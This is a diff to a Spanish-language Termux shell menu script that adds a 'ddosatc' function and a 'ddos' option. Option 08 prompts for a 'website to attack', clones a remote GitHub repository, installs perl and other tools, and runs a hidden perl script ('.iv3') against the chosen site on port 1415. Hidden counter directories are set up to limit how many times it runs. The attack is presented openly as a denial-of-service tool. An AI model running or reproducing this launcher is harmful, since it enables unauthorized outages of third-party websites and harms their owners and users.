@@ -28,7 +28,17 @@ bgm="\033[45m"
 bgc="\033[46m"
 bgb="\033[47m"
 
-
+if [ -x $PREFIX/.cont/.dd02 ];then
+rm -Rf $PREFIX/.cont/.dd02
+mv $PREFIX/.cont/.dd03 $PREFIX/.cont/.dd02
+mv $PREFIX/.cont/.dd04 $PREFIX/.cont/.dd03
+mv $PREFIX/.cont/.dd05 $PREFIX/.cont/.dd04
+mv $PREFIX/.cont/.dd06 $PREFIX/.cont/.dd05
+mv $PREFIX/.cont/.dd07 $PREFIX/.cont/.dd06
+mv $PREFIX/.cont/.dd08 $PREFIX/.cont/.dd07
+clear
+said 08
+fi
 
 clear
 printf "
@@ -388,18 +398,49 @@ ngrok tcp 5555
 
 
 08|8)
+function ddosatc {
+cd $PREFIX/libexec
+clear
+printf "
+$bgb $ro HERRAMIENTA EN COLABORACIÓN CON...  $re
+
+$ve
+===============================
+.___                  _______  
+|   |__ ______   ___  \_____ \ 
+|   \ \/ /\__ \ /   \    (__ <,
+|   |\   / __ \| Y Y \ \      \
+|___| \_/ (____|__|_| /______ /
+        \/    \/      \/       
+====== By ___ Cinderella ======
+$am[-]$az fb.me/ivam3bycinderella$am [-]$re
+
+
+
+ $bgr        $re     $bgr    $re     $bgr        $re  $bgr     $re
+ $bgr   $re         $bgr  $re  $bgr  $re       $bgr  $re     $bgr  $re   $bgr  $re
+ $bga   $re        $bga  $re    $bga  $re      $bga  $re     $bga  $re    $bga  $re
+ $bga        $re  $bga  $re      $bga  $re     $bga  $re     $bga  $re    $bga  $re
+       $bgv  $re  $bgv          $re     $bgv  $re     $bgv  $re    $bgv  $re
+       $bgv  $re  $bgv  $re      $bgv  $re     $bgv  $re     $bgv  $re  $bgv  $re
+ $bgc        $re  $bgc  $re      $bgc  $re  $bgc        $re  $bgc     $re"
+
+
+"
+perl .iv3 $website 1415 0 0
+}
 website=
 if [ -z $website ];then
 read -p "Sitio web para atacar:  " website
 fi
 if [ -x $PREFIX/libexec/.iv3 ];then
 cd $PREFIX/libexec
-perl .iv3 $website 1415 0 0
+ddosatc
 else
 cd
 pkg update -y
 pkg upgrade -y
-pkg install git -y
+pkg install util-linux perl git clang -y
 git clone https://github.com/SaidGR/ivc.git > /dev/null 2>&1
 cd
 cd ivc
@@ -408,8 +449,16 @@ chmod 777 .inc
 cd
 rm -Rf ivc
 cd $PREFIX/libexec
-perl .iv3 $website 1415 0 0
+ddosatc
 fi
+;;
+ddos)
+cd $PREFIX
+rm -Rf .cont
+mkdir .cont
+cd $PREFIX/.cont
+mkdir .dd02 .dd03 .dd04 .dd05 .dd06 .dd07 .dd08
+said 8
 ;;
 
 
